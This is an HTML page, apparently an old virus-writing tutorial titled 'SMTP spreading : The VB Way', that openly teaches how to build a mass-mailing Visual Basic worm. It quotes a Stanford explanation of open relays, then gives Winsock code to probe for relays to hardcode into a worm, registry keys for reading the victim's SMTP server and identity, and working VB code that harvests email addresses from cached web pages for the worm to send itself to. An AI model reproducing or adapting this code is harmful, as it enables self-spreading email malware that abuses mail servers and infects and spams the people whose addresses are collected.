@@ -1,0 +1,718 @@
+<HTML>
+<HEAD>
+<META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso8859-1">
+<TITLE>... </TITLE> 
+<SCRIPT language="JavaScript">
+var TlxPgNm='id8';
+</SCRIPT>
+<META http-equiv="GENERATOR" CONTENT="Created with Trellix Web, HTML Exporter 2.6.2685"> 
+<!-- MAP_LOCATION=( 144, 24) -->
+</HEAD>
+<BODY BGCOLOR="#000000" TEXT="#F7F7FF" LINK="#FFCC33" ALINK="#009D27" VLINK="#FFCC33">
+    <TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" WIDTH="100%">
+ <Tr>
+  <Td WIDTH="10" HEIGHT="10"></Td>
+  <Td width="100%"></Td>
+  <Td WIDTH="10" HEIGHT="10"></Td>
+ </Tr>
+ <Tr>
+  <Td ALIGN="LEFT" WIDTH="10" VALIGN="top"><IMG BORDER="0" SRC="1x1.gif" HEIGHT="1" ALIGN="bottom" WIDTH="10" HSPACE="0" VSPACE="0"></Td>
+  <Td><TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="5" COLOR="#DDDDDD" FACE="Arial,Helvetica,sans-serif"><B>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SMTP spreading : The VB Way</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>prelude : if you know vb, after reading this, you'll now be able to write a smtp vb worm..</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>why a hardcoded smtp mailer is worth to think twice..</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>excerpt from &quot;open relay : what's going on&quot; (http://www.stanford.edu/group/itss/css/leland/email/smtpmove/intro.htm)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<FONT SIZE="4" COLOR="#FFCC66" FACE="verdana"><FONT  FACE="Arial,Helvetica,sans-serif" SIZE= 5 ><B>&quot;.... </B></FONT><B>&nbsp;<A NAME="2">&nbsp;</A></B><B>How Internet mail works </B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="Verdana"><B>You're at home and need to do some work. You boot your computer, connect to the Internet, fire up your mail program, compose a note, and hit Send. Think no more about it. </B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="Verdana"><B>But what really happens when you send mail? </B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="Verdana"><B>When you click send, your mailer checks its configuration for the address of an SMTP Server, typically a big computer run by your Internet Service Provider (ISP) or the organization you belong to (like Stanford). Then it connects to that SMTP server, sends the message, and disconnects. </B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="Verdana"><B>An SMTP (Simple Mail Transport Protocol) server is basically the Internet mailman. The SMTP server will accept your message and find a way to deliver it. It will usually deliver the message right away, but in rare cases it will store the message on its disk, contact another SMTP server, and forward the mail on. Eventually, the note winds up at the destination, where it is stored in your recipient's Inbox. </B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="Verdana"><B>SMTP is only used for sending mail. When you read mail, you probably use a protocol like POP or IMAP. The SMTP server you use has nothing to do with the POP server you use. They can, in fact, be miles apart on different networks.</B></FONT><BR>
+<FONT SIZE="4" COLOR="#FFCC66" FACE="verdana"><B>&nbsp;<A NAME="3">&nbsp;</A></B><B>What is an open relay? </B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="Verdana"><B>Suppose you are in your campus office, and send a note to joe@caltech.edu. Your PC will contact an SMTP server at Stanford and send the note. Similarly if you want to send a note to jane@harvard.edu, you again contact the SMTP server on Stanford's campus. This is a fair use of Stanford's SMTP servers, because your PC is part of the Stanford campus network. </B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="Verdana"><B>If your friend Joe wants to send you a note, he would contact the SMTP server at CalTech which would send the message to Stanford. But what if Joe, at CalTech, used the Stanford SMTP server to send a note to Jane, at Harvard? This is an open relay situation, and is not a fair use of Stanford's computers. This technique -- putting someone else's SMTP server in an email program's outgoing host field -- is used by spammers to send junk mail through the Internet.</B></FONT><BR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="5" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>.....&quot;</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>almost all popular the smtp mail servers (yahoo, lycos, hotmail etc..) aren't open relays.. how will you know that a smtp mail server is an open relay or not?</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>vb time</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>===========================================</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Winsock1.Connect &quot;mail.server.com&quot;, 25</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>'expected response is 220</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Winsock1.SendData &quot;HELO localhost&quot; &amp; vbCrLf</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>'expected response is 250</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Winsock1.SendData &quot;MAIL FROM:&lt;openornot@yahoo.com&gt;&quot; &amp; vbCrLf</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>'expected response is 250</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>Winsock1.SendData &quot;RCPT TO:&lt;victim@notserver.com&gt;&quot; &amp; vbCrLf</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>'if response is 250, then it is an open relay server, which can be hardcoded to</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>'your vb worm, if not, it isn't and don't use it coz your vb worm won't spread</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>============================================================</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>if you want a list of the latest discovered smtp open relay server just visit,</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>http://www.openrelaycheck.com/orc/articles/spamglossary.asp</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>=============</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>smtp spreading</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>=============</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>basically, all you need to do is call winsock, search for email addys in a pc, a mail server from</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>registry, and let it send itself to those addys...</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>==============================================</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>getting mailserver and some identities from the registry</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>==============================================</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>REGEDIT4</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>[HKEY_CURRENT_USER\Software\Microsoft\Internet Account Manager\Accounts\00000001]</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&quot;Account Name&quot;=&quot;alcopaul&quot;</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&quot;SMTP Server&quot;=&quot;mail.digitelone.com&quot;</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&quot;SMTP Display Name&quot;=&quot;alcopaul&quot;</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>&quot;SMTP Email Address&quot;=&quot;alcopaul@digitelone.com&quot;</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>=================================================</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#FFCC66" FACE="Arial,Helvetica,sans-serif"><B>collecting e-mail files from the temporary internet files folder</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>=================================================</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<TABLE CELLPADDING="0" CELLSPACING="0" BORDER="0" VSPACE="0" HSPACE="0" >
+ <TR>
+  <TD ALIGN="LEFT"><FONT SIZE="2" COLOR="#BF0000" FACE="Arial,Helvetica,sans-serif"><B>here's the snippet : c:\email.txt will contain email addresses.. :)</B></FONT></TD>
+ </TR>
+ <TR>
+  <TD HEIGHT="6"></TD></TR>
+</TABLE>
+<bR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Private Declare Function SHGetSpecialFolderLocation Lib &quot;shell32.dll&quot; (ByVal hwndOwner As Long, ByVal nFolder As Long, pidl As ITEMIDLIST) As Long</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Private Declare Function SHGetPathFromIDList Lib &quot;shell32.dll&quot; Alias &quot;SHGetPathFromIDListA&quot; (ByVal pidl As Long, ByVal pszPath As String) As Long</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Const CSIDL_TIF = &amp;H20</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Private Type SHITEMID</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>cb As Long</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>abID As Byte</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End Type</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Private Type ITEMIDLIST</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>mkid As SHITEMID</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End Type</B></FONT><BR>
+<bR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Private Sub Form_Load()</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>wer567 GetSpecialfolder(CSIDL_TIF)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End Sub</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Sub wer567(dir)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>On Error Resume Next</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim fso, ssfh, filh, s, f, d, q, a, textline</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Set ssfh = fso.GetFolder(dir).SubFolders</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>For Each filh In ssfh</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>wfuck filh</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Next</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End Sub</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Sub wfuck(dir)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>On Error Resume Next</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim fso, ssfh, filh, s, f, d, q, a, textline</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Set ssfh = fso.GetFolder(dir).SubFolders</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>For Each filh In ssfh</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>DoEvents</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>ddd = ddd &amp; filh &amp; &quot;/&quot;</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Next</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>arr1 = Split(ddd, &quot;/&quot;)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>For Each sdir In arr1</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>If sdir = &quot;&quot; Then Exit For</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>aaa = aaa &amp; q23w45(sdir)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Next sdir</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Open &quot;c:\email.txt&quot; For Output As #1</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Print #1, aaa</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Close #1</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Open &quot;c:\email.txt&quot; For Input As #1</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Do While Not EOF(1)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Line Input #1, textline</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>q = q &amp; textline</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Loop</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Close #1</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>q = Replace(q, &quot;A#?@;&quot;, &quot;&quot;)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>q = Replace(q, &quot;A#?$;&quot;, &quot;&quot;)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Open &quot;c:\email.txt&quot; For Output As #1</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Print #1, q</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Close #1</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End Sub</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Function q23w45(dir)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim fso, cfh, filh, ext, textline, q, wwww</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Set cfh = fso.GetFolder(dir).Files</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>For Each filh In cfh</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>DoEvents</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>ext = fso.GetExtensionName(filh.path)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>ext = LCase(ext)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>If (ext = &quot;htm&quot;) Or (ext = &quot;html&quot;) Then</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>aaaa = aaaa &amp; xtrk(filh.path)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End If</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Next</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>q23w45 = aaaa</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End Function</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Function xtrk(gggg As String)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Dim j As Long, cnt As Long, q As String, mlto As String, wwww As String</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Open gggg For Input As #1</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Do While Not EOF(1)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Line Input #1, textline</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>q = q &amp; textline</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Loop</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Close #1</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>For j = 1 To Len(q)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>If Mid(q, j, 8) = &quot;&quot;&quot;&quot; &amp; &quot;mailto:&quot; Then</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>mlto = &quot;&quot;</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>cnt = 0</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Do While Mid(q, j + 8 + cnt, 1) &lt;&gt; &quot;&quot;&quot;&quot;</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>mlto = mlto + Mid(q, j + 8 + cnt, 1)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>cnt = cnt + 1</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Loop</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>If InStr(1, mlto, &quot;@&quot;) Then</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Else</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>mlto = &quot;A#?@&quot;</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End If</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>If InStr(1, mlto, &quot;?&quot;) Then</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>mlto = &quot;A#?$&quot;</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End If</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>mlto = Trim(mlto)</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>wwww = wwww &amp; mlto &amp; &quot;;&quot;</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>End If</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>Next</B></FONT><BR>
+<FONT SIZE="2" COLOR="#FFCC66" FACE="System"><B>xtrk = wwww</B></FONT><BR>
